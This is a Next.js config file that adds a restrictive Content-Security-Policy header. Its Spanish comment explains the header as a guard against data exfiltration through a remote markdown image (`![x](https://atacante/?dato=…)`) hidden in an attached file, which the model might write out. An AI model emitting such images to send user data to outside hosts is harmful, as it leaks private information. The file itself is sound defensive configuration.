import type { NextConfig } from "next";

// Cabecera de seguridad mínima y compatible con el resto de la app: ninguna página carga imágenes de otros dominios.
// Es la red de seguridad contra la fuga de datos por una imagen remota (p. ej. ![x](https://atacante/?dato=…) escondida
// en un archivo adjunto): aunque el modelo la escribiera y el renderizado fallara, el navegador no la pediría.
const CSP = ["img-src 'self' data: blob:", "object-src 'none'", "base-uri 'self'", "frame-ancestors 'self'"].join("; ");

const nextConfig: NextConfig = {
  // Evita que Next tome como raíz un package-lock.json de una carpeta superior
  turbopack: { root: __dirname },
  // Memoiza componentes y valores automáticamente en build
  reactCompiler: true,
  async headers() {
    return [{ source: "/:path*", headers: [{ key: "Content-Security-Policy", value: CSP }] }];
  },
};

export default nextConfig;
